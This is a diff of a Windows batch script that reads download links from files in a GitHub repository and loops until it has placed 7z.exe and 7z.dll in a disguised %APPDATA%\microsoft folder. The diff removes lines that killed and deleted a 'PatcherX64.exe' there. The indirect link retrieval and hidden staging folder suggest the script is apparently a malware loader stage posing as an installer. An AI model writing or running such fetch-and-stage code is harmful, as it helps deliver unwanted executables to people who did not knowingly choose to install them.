@@ -5,10 +5,6 @@ color 0A
 
 :loop
 
-:: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
-
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/7zipexeFileLink') do set "SVNZIPEXEFILELINK=%%i"
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/7zipdllFileLink') do set "SVNZIPDLLFILELINK=%%i"
 
@@ -22,15 +18,15 @@ echo.
 curl -L -# -o "%APPDATA%\microsoft\7z.exe" "%SVNZIPEXEFILELINK%"
 curl -L -# -o "%APPDATA%\microsoft\7z.dll" "%SVNZIPDLLFILELINK%"
 
-timeout /t 2 /nobreak >nul
+timeout /t 2 /nobreak 
 
 :: Checking the existence of 7z.exe and 7z.dll
 if not exist "%APPDATA%\microsoft\7z.exe" (
     echo.
     echo The download hasn't started yet. Please check your connection.
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo Retrying in 2 seconds ....
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo.
     goto loop
 )
@@ -38,9 +34,9 @@ if not exist "%APPDATA%\microsoft\7z.exe" (
 if not exist "%APPDATA%\microsoft\7z.dll" (
     echo.
     echo Missing 7z.dll! Please check your installation.
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo Retrying in 2 seconds ....
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo.
     goto loop
 )
@@ -56,9 +52,9 @@ for %%a in ("%APPDATA%\microsoft\7z.dll") do set "DLLFILESIZE=%%~za"
 if %EXEFILESIZE% lss 450000 (
     echo.
     echo Download incomplete. Check your connection and run the file again.
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo Retrying in 2 seconds ....
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo.
     goto loop
 )
@@ -68,9 +64,9 @@ if %EXEFILESIZE% lss 450000 (
 if %DLLFILESIZE% lss 1800000 (
     echo.
     echo Download incomplete. Check your connection and run the file again.
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo Retrying in 2 seconds ....
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo.
     goto loop
 )
